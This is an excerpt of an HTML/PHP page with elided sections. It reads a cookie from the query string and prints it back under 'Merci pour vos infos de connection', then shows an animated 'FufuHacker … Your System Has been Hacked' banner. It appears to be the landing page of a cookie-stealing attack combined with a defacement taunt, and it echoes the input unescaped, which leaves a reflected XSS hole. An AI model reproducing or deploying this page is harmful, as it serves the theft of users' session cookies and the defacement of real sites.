<html>
        ...
        */body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,form,fieldset,input,textarea,p,blockquote,th,td{margin:0;padding:0}
        ...
        #unknown h2.frame-6 span:nth-child(5){font-size:20px;-webkit-animation-delay:20s;-moz-animation-delay:20s;-ms-animation-delay:20s;animation-delay:20s;font-size:20px;color:#FFF;}
        ...
        $cookie = $_GET['cookie'];
        ?>
          <h1 style="color:#fff;">Merci pour vos infos de connection:<br> <?php var_dump($cookie);?></h1>
                <div class="container">
        <div id='unknown'>
        <div class="unknown">
        <div class="unknown1">&nbsp;</div>
        <h2 class="frame-1">FufuHacker</h2>
        <h2 class="frame-2">Into your system...</h2>
        <h2 class="frame-3"> #Hacked</h2>
        <h2 class="frame-5"><span>Your System</span> <span>Has been</span> <span>Hacked</span><br/></h2>    
